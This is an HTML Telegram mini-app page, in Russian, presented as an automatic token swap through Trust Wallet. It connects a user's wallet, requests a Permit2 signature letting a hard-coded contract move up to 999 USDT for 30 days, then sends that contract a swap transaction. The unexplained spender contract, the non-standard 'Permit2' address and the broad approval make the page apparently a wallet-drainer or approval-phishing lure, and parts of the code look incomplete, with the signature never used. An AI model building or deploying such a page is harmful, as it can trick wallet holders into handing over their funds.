<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>AutoSwap via Trust Wallet</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/eth-provider@1.0.0/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
  <style>
    body { font-family: sans-serif; background: #1a1b1e; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
    h1 { margin-bottom: 10px; }
    #qrcode { margin: 20px; background: #fff; padding: 10px; border-radius: 10px; }
    #status { margin-top: 20px; font-size: 16px; color: #66bb6a; text-align: center; }
    a { color: #2ea6ff; word-break: break-all; }
  </style>
</head>
<body>
  <h1>Подключите кошелек</h1>
  <canvas id="qrcode"></canvas>
  <div id="uriLink"></div>
  <div id="status">Инициализация...</div>

  <script>
    const CONFIG = {
      PROJECT_ID: "d868f90cd734355ae0320f8f0258b6b1",
      CHAIN_ID: 56,
      RPC: "https://bsc-dataseed.binance.org/",
      PERMIT2: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
      AUTOSWAP: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
      TOKEN: "0x55D398326f99059FF775485246999027B3197955", // USDT
      MAX_AMOUNT: "999",
      DEADLINE_DAYS: 30
    };

    const statusEl = document.getElementById("status");
    const uriLink = document.getElementById("uriLink");

    function updateStatus(text, error = false) {
      statusEl.style.color = error ? "#e64a45" : "#66bb6a";
      statusEl.textContent = text;
    }

    async function main() {
      Telegram.WebApp.ready();
      Telegram.WebApp.expand();
      updateStatus("Подключение к WalletConnect...");

      const provider = await window.WalletConnectEthereumProvider.init({
        projectId: CONFIG.PROJECT_ID,
        chains: [CONFIG.CHAIN_ID],
        showQrModal: false,
        rpcMap: { [CONFIG.CHAIN_ID]: CONFIG.RPC },
        methods: ["eth_sendTransaction", "eth_signTypedData_v4"]
      });

      // Получаем WalletConnect URI
      const wcURI = provider.connector?.uri;
      if (!wcURI) {
        updateStatus("Ошибка: URI не получен", true);
        return;
      }

      // Генерация QR и deep link
      QRCode.toCanvas(document.getElementById("qrcode"), wcURI, { width: 240 });
      const encodedURI = encodeURIComponent(wcURI);
      const trustLink = `https://link.trustwallet.com/wc?uri=${encodedURI}`;
      uriLink.innerHTML = `<a href="${trustLink}" target="_blank">Открыть в Trust Wallet</a>`;

      // Подключение
      let accounts;
      try {
        accounts = await provider.enable();
      } catch (e) {
        updateStatus("Кошелек не подключен: " + e.message, true);
        return;
      }

      const owner = accounts[0];
      updateStatus("Кошелек подключен: " + owner);

      const chainId = parseInt(await provider.request({ method: "eth_chainId" }), 16);
      if (chainId !== CONFIG.CHAIN_ID) {
        updateStatus("Ошибка: неправильная сеть (ожидается BSC)", true);
        return;
      }

      // Подпись Permit2
      updateStatus("Готовим Permit2-подпись...");
      const now = Math.floor(Date.now() / 1000);
      const deadline = now + CONFIG.DEADLINE_DAYS * 86400;
      const nonce = Date.now(); // временный nonce
      const amount = ethers.parseUnits(CONFIG.MAX_AMOUNT, 18);

      const domain = {
        name: "Permit2",
        chainId: CONFIG.CHAIN_ID,
        verifyingContract: CONFIG.PERMIT2
      };

      const types = {
        PermitTransferFrom: [
          { name: "permitted", type: "TokenPermissions" },
          { name: "spender", type: "address" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" }
        ],
        TokenPermissions: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint256" }
        ]
      };

      const message = {
        permitted: {
          token: CONFIG.TOKEN,
          amount: amount.toString()
        },
        spender: CONFIG.AUTOSWAP,
        nonce: nonce,
        deadline: deadline
      };

      const typedData = {
        types: types,
        domain: domain,
        primaryType: "PermitTransferFrom",
        message: message
      };

      let signature;
      try {
        signature = await provider.request({
          method: "eth_signTypedData_v4",
          params: [owner, JSON.stringify(typedData)]
        });
      } catch (e) {
        updateStatus("Ошибка подписи: " + e.message, true);
        return;
      }

      updateStatus("Permit2 подписан, вызываем swap...");

      // Подготовка calldata swapForUser(owner, amount)
      const iface = new ethers.Interface(["function swapForUser(address user, uint256 amount)"]);
      const data = iface.encodeFunctionData("swapForUser", [owner, amount]);

      const tx = {
        from: owner,
        to: CONFIG.AUTOSWAP,
        data: data
      };

      try {
        const txHash = await provider.request({
          method: "eth_sendTransaction",
          params: [tx]
        });
        updateStatus("✅ Транзакция отправлена: " + txHash);
      } catch (e) {
        updateStatus("Ошибка отправки транзакции: " + e.message, true);
      }
    }

    main();
  </script>
</body>
</html>